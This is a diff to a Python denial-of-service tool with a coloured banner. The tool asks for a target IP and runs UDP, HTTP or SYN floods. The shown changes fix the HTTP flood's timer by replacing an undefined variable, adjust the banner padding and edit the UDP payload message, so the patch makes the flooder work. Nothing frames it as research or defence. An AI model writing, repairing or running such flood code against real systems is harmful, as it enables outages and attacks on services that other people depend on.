@@ -24,7 +24,7 @@ print("""
 \033[31m║\033[100m         \033[31m█╔════█╗\033[33m █║\033[32m       █╔══█╚╗\033[97m █╔════╝\033[34m █║  █║                     \033[31m║
 \033[31m║\033[100m         \033[31m█║    █║\033[33m █║\033[32m      █║    █║\033[97m █║\033[34m      █║ █║                      \033[31m║
 \033[31m║\033[100m         \033[31m██████═╝\033[33m █║\033[32m      █║    █║\033[97m █║\033[34m      ███╝                       \033[31m║   
-\033[31m║\033[100m         \033[31m█╔════█╗\033[33m █║\033[32m      █║    █║\033[97m █║\033[34m      █╔═█╗                      \033[31m║
+\033[31m║\033[100m         \033[31m█╔════█╗\033[33m █║\033[32m      █║    █║\033[97m █║\033[34m      █╔═█╗                     \033[31m║
 \033[31m║\033[100m         \033[31m█║    █║\033[33m █║\033[32m      ███████║\033[97m █║\033[34m      █║  █║                     \033[31m║
 \033[31m║\033[100m         \033[31m██████╔╝\033[33m ██████╗\033[32m █╔════█║\033[97m ██████║\033[34m █║   █║                    \033[31m║
 \033[31m║\033[100m         \033[31m╚═════╝\033[33m  ╚═════╝\033[32m ╚╝    ╚╝\033[97m ╚═════╝\033[34m ╚╝   ╚╝                    \033[31m║
@@ -40,7 +40,7 @@ print("""
 # Versi dan IP
 print(f"\033[97m╔{'═' * 70}╗")
 print(f"\033[97m║ \033[104m{' ' * 4}v.1.0{' ' * 59}\033[0m ║")
-print(f"\033[97m║ \033[104m{' ' * 4}https://www.https//kunkaffa@gmail.com{' ' * 26}\033[0m ║")
+print(f"\033[97m║ \033[104m{' ' * 4}https://www.https//kunkaffa@gmail.com{' ' * 27}\033[0m ║")
 print(f"\033[97m╚{'═' * 70}╝")
 
 # Meminta IP target
@@ -123,7 +123,7 @@ def http_flood(ip, port, duration):
     http_request = b"GET / HTTP/1.1\r\nHost: target.com\r\n\r\n"
 
     sent = 0
-    timeout = time.time() + int(dur)
+    timeout = time.time() + int(duration)
 
     while True:
         try:
@@ -148,7 +148,7 @@ attack_type = input((
     "Enter the type of attack (Choose Number) (1.UDP/2.HTTP/3.SYN): ", "green"))
 
 if attack_type == "1":
-    message = b"Sending 1337 packets baby"
+    message = b"Sending 1337 packets "
     print(("UDP attack selected", "red"))
     udp_flood(ip, port, message, duration)
     print(("UDP attack completed", "red"))
